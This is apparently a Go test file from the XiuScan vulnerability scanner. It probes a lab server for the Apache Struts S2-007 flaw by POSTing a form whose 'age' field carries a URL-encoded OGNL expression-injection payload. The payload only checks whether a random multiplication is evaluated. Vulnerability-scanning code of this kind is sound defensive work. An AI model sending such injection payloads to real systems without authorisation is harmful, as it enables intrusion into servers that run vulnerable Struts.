package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"strconv"
	"strings"
	"testing"
)

func TestS2007(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	payload := "name=test&email=123@qq.com&age=%27%2B%28__rand_1__*__rand_2__%29%2B%27"
	payload = strings.ReplaceAll(payload, "__rand_1__", strconv.Itoa(rand1))
	payload = strings.ReplaceAll(payload, "__rand_2__", strconv.Itoa(rand2))
	log.Info("payload: %s", payload)
	headers := make(map[string]string)
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	req := &http.Request{
		Url:     http.NewUrl("http://192.168.222.132:8080/user.action"),
		Method:  "POST",
		Body:    payload,
		Headers: headers,
	}
	resp := http.DoRequest(req)
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-007")
	}
}
